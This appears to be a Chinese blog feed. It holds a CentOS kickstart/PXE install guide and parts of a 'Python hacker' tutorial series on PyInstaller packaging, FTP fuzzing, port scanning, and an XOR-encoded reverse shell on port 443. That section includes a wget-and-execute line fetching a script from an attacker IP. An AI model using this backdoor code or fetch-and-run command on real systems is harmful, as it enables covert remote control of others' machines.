创建ks.cfg文件</h1><blockquote><p>通常，我们在安装操作系统的过程中，需要大量的和服务器交互操作，为了减少这个交互过程，kickstart就诞生了。使用这种kickstart，只需事先定义好一个Kickstart自动应答配置文件ks.cfg（通常存放在安装服务器上），并让安装程序知道该配置文件的位置，在安装过程中安装程序就可以自己从该文件中读取安装配置，这样就避免了在安装过程中多次的人机交互，从而实现无人值守的自动化安装。</p></blockquote><p><strong><code>生成kickstart配置文件的三种方法：</code></strong></p><ul><li>方法1、 每安装好一台Centos机器，Centos安装程序都会创建一个kickstart配置文件，记录你的真实安装配置。如果你希望实现和某系统类似的安装，可以基于该系统的kickstart配置文件来生成你自己的kickstart配置文件。（生成的文件名字叫anaconda-ks.cfg位于/root/anaconda-ks.cfg）</li><li>方法2、Centos提供了一个图形化的kickstart配置工具。在任何一个安装好的Linux系统上运行该工具，就可以很容易地创建你自己的kickstart配置文件。kickstart配置工具命令为rsystem-config-kickstart,网上有很多用CentOS桌面版生成ks文件的文章，如果有现成的系统就没什么可说。但没有现成的，也没有必要去用桌面版，命令行也很简单。</li><li>方法3、阅读kickstart配置文件的手册。用任何一个文本编辑器都可以创建你自己的kickstart配置文件。</li></ul><p><strong><code>这里贴出我的ks.cfg,这个是CentOS6.8的,可以根据需求更改</code></strong></p><p><strong><code>这里是官方文档</code><a href="https://access.redhat.com/documentation/zh-CN/Red_Hat_Enterprise_Linux/6/html/Installation_Guide/s1-kickstart2-options.html" target="_blank" rel="noopener">详解ks.cfg配置文件语句CentOS</a></strong></p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#platform=x86, AMD64, 或 Intel EM64T</span></div><div class="line"><span class="comment">#version=DEVEL</span></div><div class="line"><span class="comment"># Firewall configuration</span></div><div class="line">firewall --enabled --http --ssh</div><div class="line"><span class="comment"># Install OS instead of upgrade</span></div><div class="line">install</div><div class="line"><span class="comment"># Use network installation</span></div><div class="line">url --url=<span class="string">"http://192.168.1.52/CentOS6.5"</span></div><div class="line"><span class="comment"># Root password</span></div><div class="line">rootpw --iscrypted <span class="variable">$1</span><span class="variable">$xn3sYOAA</span><span class="variable">$jOfmmjxxYA</span>/IRjFm0BM5O0</div><div class="line"><span class="comment"># System authorization information</span></div><div class="line">auth  --useshadow  --passalgo=sha512</div><div class="line"><span class="comment"># Use graphical install</span></div><div class="line">graphical</div><div class="line"><span class="comment"># System keyboard</span></div><div class="line">keyboard us</div><div class="line"><span class="comment"># System language</span></div><div class="line">lang zh_CN</div><div class="line"><span class="comment"># SELinux configuration</span></div><div class="line">selinux --enforcing</div><div class="line"><span class="comment"># Do not configure the X Window System</span></div><div class="line">skipx</div><div class="line"><span class="comment"># Installation logging level</span></div><div class="line">logging --level=info</div><div class="line"></div><div class="line"><span class="comment"># System timezone</span></div><div class="line">timezone  Africa/Libreville</div><div class="line"><span class="comment"># System bootloader configuration</span></div><div class="line">bootloader --location=mbr</div><div class="line"><span class="comment"># Partition clearing information</span></div><div class="line">clearpart --all  </div><div class="line"></div><div class="line">%packages</div><div class="line">@php</div><div class="line"></div><div class="line">%end</div></pre></div></div></figure><h1 id="8-整合Default配置文件实现无人值守"><a href="#8-整合Default配置文件实现无人值守" class="headerlink" title="8. 整合Default配置文件实现无人值守"></a>8. 整合Default配置文件实现无人值守</h1><p><code>vim /var/lib/tftpboot/pxelinux.cfg/default</code></p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line">default ks</div><div class="line">prompt 0</div><div class="line">label ks</div><div class="line">  kernel vmlinuz</div><div class="line">  append initrd=initrd.img ks=http://192.168.1.52/ks_config/CentOS-6.5-ks.cfg <span class="comment"># 告诉安装程序ks.cfg文件在哪里</span></div><div class="line"><span class="comment"># append initrd=initrd.img ks=http://192.168.1.52/ks_config/CentOS-6.5-ks.cfg ksdevice=eth0</span></div><div class="line"><span class="comment"># ksdevice=eth0代表当客户端有多块网卡的时候，要实现自动化需要设置从eth1安装，不指定的话，安装的时候系统会让你选择，那就不叫全自动化了</span></div></pre></div></div></figure><h1 id="9-打开系统电源-出去吃个饭-过会回来-系统就以经装好了"><a href="#9-打开系统电源-出去吃个饭-过会回来-系统就以经装好了" class="headerlink" title="9. 打开系统电源,出去吃个饭,过会回来,系统就以经装好了"></a>9. 打开系统电源,出去吃个饭,过会回来,系统就以经装好了</h1><p><strong><code>关闭服务端的iptables,selinux</code></strong></p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">service iptables stop</div><div class="line">setenforce 0</div></pre></div></div></figure><blockquote><p>其cobbler也可实现无人值守,属于工具</p></blockquote>]]></content>
      
      <categories>
          
          <category> 自动化运维 </category>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Python黑客之旅0x5</title>
      <link href="/2015/10/17/pythonhacker_0x5/"/>
      <url>/2015/10/17/pythonhacker_0x5/</url>
      <content type="html"><![CDATA[<h2 id="使用PyInstaller生成可以执行程序"><a href="#使用PyInstaller生成可以执行程序" class="headerlink" title="使用PyInstaller生成可以执行程序"></a>使用PyInstaller生成可以执行程序</h2><p>这一章是教大家如何把自己的python脚本编译成windows下可执行文件，它可以让你的python脚本跨平台去运行，并且不需要去安装python解释器。首先我们需要下载依赖包,cygwin(或者其他的工具也可以，这里我们使用Pywin).</p><a id="more"></a><h1 id="Python转exe"><a href="#Python转exe" class="headerlink" title="Python转exe"></a>Python转exe</h1><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>Linux: <code>sudo apt-get install python2.7 build-essential python-dev zlib1g-dev upx</code></p><p>Windows: <a href="http://www.activestate.com/activepython" target="_blank" rel="noopener">http://www.activestate.com/activepython</a> (fully packaged installer file)</p><p>安装 <a href="http://sourceforge.net/projects/pywin32/" target="_blank" rel="noopener">Pywin32</a>, <a href="https://pypi.python.org/pypi/setuptools#downloads" target="_blank" rel="noopener">Setuptools</a>, <a href="http://www.pyinstaller.org/" target="_blank" rel="noopener">PyInstaller</a></p><h3 id="安装完成之后"><a href="#安装完成之后" class="headerlink" title="安装完成之后"></a>安装完成之后</h3><p>下一步我们就运行python命令生成可执行文件:</p><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">python pyinstaller.py --onefile &lt;scriptName&gt;</div></pre></div></div></figure><p>执行上面的命令之后，导入依赖文件并且生成一个新的文件，这个文件里面包含了三个文件<code>&lt;scriptName&gt;.txt,&lt;scriptName&gt;.spec</code>和<code>&lt;scriptName&gt;.exe</code>文件，其中.txt与.spec可以删除掉，而<strong><em>.exe</em></strong>的文件就是你需要的执行程序.</p><h3 id="完整的封装执行程序"><a href="#完整的封装执行程序" class="headerlink" title="完整的封装执行程序"></a>完整的封装执行程序</h3><p>Python脚本现在已经被编译成了windows PE文件，并且不需要Python解释器就能够在windows下面独立运行，这可以让你更轻松的把脚本迁移到windows上面而且不用担心依赖包缺失的问题.</p><p>一个简单的脚本:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"> </div><div class="line"><span class="keyword">import</span> os</div><div class="line"> </div><div class="line">os.system(<span class="string">"echo Hello World!"</span>)</div></pre></div></div></figure><p>现在我们把上面这个脚本编译成为一个可以执行的文件:</p><p><strong>Windows</strong></p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">c:\PathToPython\python.exe pyinstaller.py --onefile helloWorld.py</div><div class="line"> </div><div class="line">&gt; helloWorld.exe</div><div class="line">Hello World!</div></pre></div></div></figure><p><strong>Linux</strong></p><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">pytnstaller --onefile helloworld.py</div></pre></div></div></figure><blockquote><p>生成后的可执行文件在<code>dist</code>文件夹中</p></blockquote><blockquote><p>如果你想更详细的了解这个过程，可以参考<a href="http://www.primalsecurity.net/back-to-the-source-code-forwardingreverse-engineering-python-malware/" target="_blank" rel="noopener">BACK TO THE SOURCE CODE – Forward/Reverse Engineering Python Malware</a></p></blockquote><p>把你的python脚本编译成一个可以在windows上面可以执行的可执行程序是很有用的，因为它不需要你安装python解释器还有依赖包</p><p>大家可以尝试一下<strong>0x3</strong>中的例子，把那个脚本编译成可执行程序。下一章</p>]]></content>
      
      <categories>
          
          <category> Python </category>
          
          <category> Hacker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Python黑客之旅0x4</title>
      <link href="/2015/10/16/pythonhacker_0x4/"/>
      <url>/2015/10/16/pythonhacker_0x4/</url>
      <content type="html"><![CDATA[<h2 id="编写Fuzz测试脚本"><a href="#编写Fuzz测试脚本" class="headerlink" title="编写Fuzz测试脚本"></a>编写Fuzz测试脚本</h2><p> 这一章将会演示教你如何写一个属于自己的<code>Fuzz</code>测试脚本，当我们进行<code>exploit</code>研究和开发的时候就可以使用脚本语言发送大量的测试数据给受害者机器，但是这个错误数据很容易引发应用程序崩溃掉。</p><p>而<code>Python</code>却不同，当程序崩溃之后，此时你的程序会暂时断开连接，随后会立即创建一个新的连接继续执行。</p><p> 下面我们首先要解决的问题是应用程序如何处理用户输入的内容，因为在进行模糊测试的时候，我们会不定时的想到一些新的思路然后把数据发送给受害者机器上面来测试，这基本思路就是先与服务器建立连接,然后发送测试数据给服务器，通过<code>while</code>循环语句来判断是否成功，即使出现错误也会处理掉:</p><a id="more"></a><h2 id="下面是我们的扫描器伪代码"><a href="#下面是我们的扫描器伪代码" class="headerlink" title="下面是我们的扫描器伪代码:"></a>下面是我们的扫描器伪代码:</h2><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></div><div class="code"><pre><div class="line"> <span class="comment">#导入socket,sys模块，如果是web服务那么还需要导入httplib,urllib等模块</span></div><div class="line"> &lt;<span class="keyword">import</span> modules&gt; </div><div class="line"></div><div class="line"><span class="comment">#设置ip/端口</span></div><div class="line"><span class="comment">#调用脚本: ./script.py &lt;RHOST&gt; &lt;RPORT&gt;</span></div><div class="line">RHOST = sys.argv[<span class="number">1</span>]</div><div class="line">RPORT = sys.argv[<span class="number">2</span>]</div><div class="line"> </div><div class="line"><span class="comment">#定义你的测试数据,并且设置测试数据范围值</span></div><div class="line">buffer = <span class="string">'\x41'</span>*<span class="number">50</span></div><div class="line"> </div><div class="line"><span class="comment">#使用循环来连接服务并且发送测试数据</span></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">  <span class="keyword">try</span>:</div><div class="line">    <span class="comment"># 发送测试数据</span></div><div class="line">    <span class="comment"># 直到递增到50</span></div><div class="line">    buffer = buffer + <span class="string">'\x41'</span>*<span class="number">50</span></div><div class="line">  <span class="keyword">except</span>:</div><div class="line">    <span class="keyword">print</span> <span class="string">"Buffer Length: "</span>+len(buffer)</div><div class="line">    <span class="keyword">print</span> <span class="string">"Can't connect to service...check debugger for potential crash"</span></div></pre></div></div></figure><p>上面这个脚本框架能够适用于各种服务，你可以根据你的服务(<code>https,http,mysql,sshd</code>)编写特定模糊测试脚本.下面我们演示一个基于<code>USER</code>命令的ftp服务器模糊测试脚本:</p><h2 id="模糊测试脚本"><a href="#模糊测试脚本" class="headerlink" title="模糊测试脚本"></a>模糊测试脚本</h2><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#导入你将要使用的模块，这样你就不用去自己实现那些功能函数了</span></div><div class="line"><span class="keyword">import</span> sys, socket</div><div class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</div><div class="line"> </div><div class="line"><span class="comment">#声明第一个变量target用来接收从命令端输入的第一个值</span></div><div class="line">target = sys.argv[<span class="number">1</span>]</div><div class="line"><span class="comment">#创建50个A的字符串 '\x41'</span></div><div class="line">buff = <span class="string">'\x41'</span>*<span class="number">50</span></div><div class="line"> </div><div class="line"><span class="comment"># 使用循环来递增至声明buff变量的长度50</span></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">  <span class="comment">#使用"try - except"处理错误与动作</span></div><div class="line">  <span class="keyword">try</span>:</div><div class="line">    <span class="comment"># 连接这目标主机的ftp端口 21</span></div><div class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</div><div class="line">    s.settimeout(<span class="number">2</span>)</div><div class="line">    s.connect((target,<span class="number">21</span>))</div><div class="line">    s.recv(<span class="number">1024</span>)</div><div class="line"> </div><div class="line">    <span class="keyword">print</span> <span class="string">"Sending buffer with length: "</span>+str(len(buff))</div><div class="line">    <span class="comment">#发送字符串:USER并且带有测试的用户名</span></div><div class="line">    s.send(<span class="string">"USER "</span>+buff+<span class="string">"\r\n"</span>)</div><div class="line">    s.close()</div><div class="line">    sleep(<span class="number">1</span>)</div><div class="line">    <span class="comment">#使用循环来递增直至长度为50</span></div><div class="line">    buff = buff + <span class="string">'\x41'</span>*<span class="number">50</span></div><div class="line"> </div><div class="line">  <span class="keyword">except</span>: <span class="comment"># 如果连接服务器失败，我们就打印出下面的结果</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"[+] Crash occured with buffer length: "</span>+str(len(buff)<span class="number">-50</span>)</div><div class="line">    sys.exit()</div></pre></div></div></figure><blockquote><p>上面这段代码演示了一个基本的Fuzz测试脚本，但是值得注意的是执行上面的代码，提交<code>\x41</code>字符可能不会让你成功的拿下受害主机，但是你可以尝试组合一些其他的字符(用户词典).此外还有一个更加强大的Fuzz测试工具<a href="https://www.blackhat.com/presentations/bh-usa-02/bh-us-02-aitel-spike.ppt" target="_blank" rel="noopener">Spike</a>和<a href="http://resources.infosecinstitute.com/intro-to-fuzzing/" target="_blank" rel="noopener">具体介绍与演示</a>,它可以一次性的测试大量数据，并且能让你提高成功概率.</p></blockquote><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>大家可以把上面的<code>ftp</code>测试换成<code>http</code>测试，这里提示:你可能需要使用<code>httplib/urllib</code>.下一章</p>]]></content>
      
      <categories>
          
          <category> Python </category>
          
          <category> Hacker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Python黑客之旅0x3</title>
      <link href="/2015/10/15/pythonhacker_0x3/"/>
      <url>/2015/10/15/pythonhacker_0x3/</url>
      <content type="html"><![CDATA[<h2 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h2><a id="more"></a><p>参考阅读:<a href="http://os.51cto.com/art/201312/424378.htm" target="_blank" rel="noopener">什么是反向Shell</a></p><p>这篇教程将会教你使用Python编写一个反向shell，首先我们先演示使用Python如何利用web服务器的功能，把文件从另一台主机传送过来。我们假设你有一台傀儡主机，你现在想下载傀儡机上面的的文件。那么你就可以使用shell(或meterpreter)去访问这台傀儡机，你可以通过一行Python代码把傀儡机建立成为一个web服务器，然后下载傀儡机上面的文件.</p><p>创建一个python HTTP服务器可以直接使用python的内建函数”SimpleHTTPServer”来创建，你可以使用’-m’参数直接在命令行调用模块，创建的服务器默认是监听的8000端口，但是你可以指定端口，直接在’SimpleHTTPServer’后面跟一个端口参数:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">python -m SimpleHTTPServer <span class="number">80</span></div><div class="line">Serving HTTP on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="number">80</span> ...</div></pre></div></div></figure><p>我们假设你没有防火墙去阻止你的连接，那么你是可以请求到这服务器的数据。你可以在任何目录里面去启动Python HTTP服务器，这样你就能够通过浏览器或者是远程客户端来访问这个目录。这里有一个简单的例子告诉你使用wget工具去获取文件,但是有些时候就会经常发现你根本没有权限在当前目录写入文件并且初始化这个脚本，但是你可以改变脚本执行的目录，下面这个例子就演示了把脚本在/tmp目录下面执行：</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#使用-O参数，把文件保存在其他目录- /tmp/ 一般可写</span></div><div class="line">wget -O /tmp/shell.py http://&lt;attacker_ip&gt;/shell.py</div><div class="line"> </div><div class="line"><span class="comment">#修改权限</span></div><div class="line">chmod a+x /tmp/shell.py</div><div class="line"> </div><div class="line"><span class="comment"># 使用file命令检查文件是否正确</span></div><div class="line">file /tmp/shell.py</div><div class="line"> </div><div class="line"><span class="comment">#执行脚本</span></div><div class="line">/usr/bin/python /tmp/shell.py</div></pre></div></div></figure><h2 id="客户端反向shell代码"><a href="#客户端反向shell代码" class="headerlink" title="客户端反向shell代码"></a>客户端反向shell代码</h2><p>阅读下面的后门代码。编码时会使用到<code>socket</code>，<code>subprocess</code>和<code>sys</code>模块，选择<code>subprocess</code>模块原因，是因为它允许使用一个变量储存STDOUT输出的结果，之后可以在代码中的其他部分通过调用此变量访问保存的STDOUT数据。下面的代码中：所建立的连接会监听<code>443</code>端口。<code>443</code>端口经常用在<strong>https</strong>上，这里使用<code>443</code>端口可以起到混淆视听的作用:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"> </div><div class="line"><span class="keyword">import</span> socket,subprocess,sys</div><div class="line"> </div><div class="line">RHOST = sys.argv[<span class="number">1</span>]</div><div class="line">RPORT = <span class="number">443</span></div><div class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">s.connect((RHOST, RPORT))</div><div class="line"> </div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">     <span class="comment"># 从socket中接收XOR编码的数据</span></div><div class="line">     data = s.recv(<span class="number">1024</span>)</div><div class="line"> </div><div class="line">     <span class="comment"># XOR the data again with a '\x41' to get back to normal data</span></div><div class="line">     en_data = bytearray(data)</div><div class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> range(len(en_data)):</div><div class="line">       en_data[i] ^=<span class="number">0x41</span></div><div class="line"> </div><div class="line">     <span class="comment"># 执行解码命令，subprocess模块能够通过PIPE STDOUT/STDERR/STDIN把值赋值给一个变量</span></div><div class="line">     comm = subprocess.Popen(str(en_data), shell=<span class="keyword">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</div><div class="line">     comm.wait()</div><div class="line">     STDOUT, STDERR = comm.communicate()</div><div class="line"> </div><div class="line">     <span class="comment"># 输出编码后的数据并且发送给指定的主机RHOST</span></div><div class="line">     en_STDOUT = bytearray(STDOUT)</div><div class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> range(len(en_STDOUT)):</div><div class="line">       en_STDOUT[i] ^=<span class="number">0x41</span></div><div class="line">     s.send(en_STDOUT)</div><div class="line">s.close()</div></pre></div></div></figure><p>上面的代码中有些概念已经在<a href="http://www.kionf.com/python/2015/10/14/pythonhacker_0x2.html" target="_blank" rel="noopener">0x2</a>介绍过了，但是除了之前的使用socket创建一个连接之外，我们通过subprocess模块执行了一个命令，<code>subprocess</code>模块非常的方便，它允许你通过STDOUT/STDERR命令直接把值赋值给一个变量，然后我们可以通过命令把输出的进行编码然后通过socket网络发送出去。</p><p>使用OXR的好处就是你能够很容易编码你要发送过去的数据，然后通过相同的密钥来解码返回的数据，最后解码后的数据可以以明文的形式去执行命令。</p><h2 id="服务端监听shell代码"><a href="#服务端监听shell代码" class="headerlink" title="服务端监听shell代码"></a>服务端监听shell代码</h2><p>现在为了利用好这个后门，我们需要一个监听脚本并且解码后端传输过来的数据，让我们通过明文很清晰的看清楚返回的数据。</p><p>下面我们将要设计一个监听器。来获取反向shell的数据，并且能够对于输入／输出的进行解码/编码，为了能够在终端上面能够很清晰的看出来，所以需要使用XOR编码:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">import</span> socket </div><div class="line"></div><div class="line">s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">s.bind((<span class="string">"0.0.0.0"</span>, <span class="number">443</span>))</div><div class="line">s.listen(<span class="number">2</span>)</div><div class="line"><span class="keyword">print</span> <span class="string">"Listening on port 443... "</span></div><div class="line">(client, (ip, port)) = s.accept()</div><div class="line"><span class="keyword">print</span> <span class="string">" Received connection from : "</span>, ip</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line"> command = raw_input(<span class="string">'~$ '</span>)</div><div class="line"> encode = bytearray(command)</div><div class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(encode)):</div><div class="line">   encode[i] ^=<span class="number">0x41</span></div><div class="line"> client.send(encode)</div><div class="line"> en_data=client.recv(<span class="number">2048</span>)</div><div class="line"> decode = bytearray(en_data)</div><div class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(decode)):</div><div class="line">   decode[i] ^=<span class="number">0x41</span></div><div class="line"> <span class="keyword">print</span> decode</div><div class="line"> </div><div class="line">client.close()</div><div class="line">s.close()</div></pre></div></div></figure><blockquote><p>这章的例子非常有趣，对于学习信息安全的朋友都喜欢shell，大家可以对代码做点修改让这个脚本也能够在window上面也能够正常运行，最后大家可以使用<code>base64</code>来代替XOR进行编码与解码，这些练习让你你更加熟练的使用python.下一章</p></blockquote>]]></content>
      
      <categories>
          
          <category> Python </category>
          
          <category> Hacker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Python黑客之旅0x2</title>
      <link href="/2015/10/14/pythonhacker_0x2/"/>
      <url>/2015/10/14/pythonhacker_0x2/</url>
      <content type="html"><![CDATA[<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>这一章将会演示如何通过Python的网络连接来开发一个基础的端口扫描器,我们的设计思路是使用socket一遍又一遍的去连接ip与端口的组合的新值,为了方面我们能够快速的完成它，首先需要介绍一点新的概念,for循环:</p><a id="more"></a><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">1000</span>,<span class="number">1024</span>):</div><div class="line"><span class="meta">... </span>  <span class="keyword">print</span> <span class="string">"[+] The port is: "</span>+str(port)</div><div class="line">...</div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1000</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1001</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1002</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1003</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1004</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1005</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1006</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1007</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1008</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1009</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1010</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1011</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1012</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1013</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1014</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1015</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1016</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1017</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1018</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1019</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1020</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1021</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1022</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1023</span></div></pre></div></div></figure><p>注意上面那段代码在循环体内的缩进，通常情况下是空两格或一个tab键，但这都没有关系，只要你的整个代码一直就可以了。我么所写的那个简短的端口扫描器的核心代码会写在上面代码中的输出块部分，然后建立一个socket连接。下面的代码就演示了如何使用内建的socket模块去建立一个socket连接：</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> socket</div><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s = socket.socket()</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s.connect((<span class="string">'127.0.0.1s'</span>, <span class="number">22</span>))</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s.send(<span class="string">'Primal Security \n'</span>)</div><div class="line"><span class="number">17</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>banner = s.recv(<span class="number">1024</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> banner</div><div class="line">OpenSSH</div></pre></div></div></figure><p>上面这个例子：我们先import这socket模块并且调用connect()函数去连接指定的IP地址与端口。它就会建立一个TCP连接(SYN/SYN-ACK/ACK)并且我们再通过send()函数给服务器发送一个真实的数据，然后使用recv()打印出响应的内容。现在教大家如何容错socket，对于不能打开的连接:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">23</span>))</div><div class="line">Traceback (most recent call last):</div><div class="line">  File "&lt;stdin&gt;", line 1, in ?</div><div class="line">  File <span class="string">"&lt;string&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> connect</div><div class="line">socket.error: (<span class="number">111</span>, <span 